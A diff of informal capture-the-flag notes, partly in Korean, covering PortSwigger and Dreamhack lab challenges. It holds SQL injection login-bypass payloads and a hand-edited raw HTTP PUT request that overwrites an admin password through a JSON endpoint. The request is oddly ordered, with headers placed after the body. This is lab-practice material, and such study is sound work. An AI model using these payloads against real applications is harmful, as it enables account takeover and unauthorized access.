@@ -1,7 +1,39 @@
-1. <SQL Injection - login bypass>
+[Portswigger] SQL Injection - login bypass
 goal: log into the application as the administrator user.
 
 SELECT firstname FROM users WHERE username='admin' AND password='1234'
 SELECT firstname FROM users WHERE username='admininstrator'-- AND password='1234'
 
 --로 뒷부분 주석처리하기.
+
+[Dreamhack] simple_sqli_chatgpt
+소스코드 열어봐서 app 들여다보면 userlevel 파라미터를 검증하지 않음. 전형적인 string-based 공격.
+0' AND userid='admin 
+심플.
+
+Really not SQL , JSON
+버프수트 리피터로 보내야돼. PUT으로 method 바꿔서. 그걸로 비번 새걸로 뒤집어쓰는거지.
+DEV 켜져있어서. 글고 비번은 sha256됨.
+METHOND / path HTTP/1.1 이런느낌?
+오글고 request필드 내가 갈아엎었잖아. 이건 http 요청이라 띄어쓰기 기준으로 헤더바디 나뉨. 
+error occured가 어디서뜨는지 찾아
+
+
+PUT /user/admin.json HTTP/1.1
+Host: host8.dreamhack.games:12794
+Content-Type: application/json
+Content-Length: 667
+Connection: keep-alive
+
+{"no":0,"id":"admin","password":"fc8252c8dc55839967c58b9ad755a59b61b67c13227ddae4bd3f78a38bf394f7"}
+Cache-Control: max-age=0
+Accept-Language: ko-KR,ko;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Origin: http://host3.dreamhack.games:23321
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://host3.dreamhack.games:23321/login.php
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=3ul24k3soevgpgahe5d1p1vods
+Connection: keep-alive
+
